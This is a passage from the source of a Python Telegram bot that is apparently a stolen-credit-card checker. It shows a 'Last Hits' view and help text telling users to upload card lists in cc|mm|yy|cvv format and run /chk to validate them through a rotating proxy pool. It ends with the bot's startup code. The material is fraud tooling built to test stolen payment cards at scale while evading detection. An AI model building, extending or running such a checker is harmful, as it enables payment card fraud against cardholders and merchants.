            last = lines[-10:][::-1]
            body = "\n".join(f"{e('cash')} <code>{l.split(' | ')[0]}</code>" for l in last)
            txt = (f"{e('diamond')} <b>Last Hits</b>\n"
                   f"<b>━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
                   f"{body}\n"
                   f"<b>━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
                   f"{e('chart')} <b>Total:</b> <code>{len(lines)}</code>")
        bot.edit_message_text(chat_id=c.message.chat.id, message_id=c.message.message_id,
            text=txt, reply_markup=back_kb(), parse_mode="HTML")

    elif d == "ui_help":
        txt = (
            f"{e('pin')} <b>╔══════════════════════════╗</b> {e('pin')}\n"
            f"<b>   {bold('HOW TO USE')}   </b>\n"
            f"{e('diamond')} <b>╚══════════════════════════╝</b> {e('diamond')}\n\n"
            f"{e('arrow_r')} Prepare a <code>.txt</code> file\n"
            f"   <i>Format: cc|mm|yy|cvv</i>\n"
            f"   <i>Example: 4111111111111111|12|26|123</i>\n\n"
            f"{e('arrow_r')} Send the file to this bot\n\n"
            f"{e('arrow_r')} Reply with <code>/chk</code>\n\n"
            f"{e('arrow_r')} Watch hits roll in {e('diamond')}\n\n"
            f"<b>Commands:</b>\n"
            f"• <code>/start</code> — welcome\n"
            f"• <code>/chk</code> — check (reply to file)\n"
            f"• <code>/stop</code> — stop run\n"
            f"• <code>/proxies</code> — view proxy pool\n"
            f"• <code>/menu</code> — main menu\n\n"
            f"<b>━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
            f"{e('crown2')} <b>Bot By {OWNER_TAG}</b>"
        )
        bot.edit_message_text(chat_id=c.message.chat.id, message_id=c.message.message_id,
            text=txt, reply_markup=back_kb(), parse_mode="HTML")

# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════
if __name__ == "__main__":
    print(f"🚀 {BOT_NAME} starting…")
    print(f"🛡 Proxies loaded: {len(PROXIES)}")
    for p in PROXIES:
        print(f"   • {masked_proxy(p)}")
    bot.infinity_polling(timeout=30, long_polling_timeout=30)
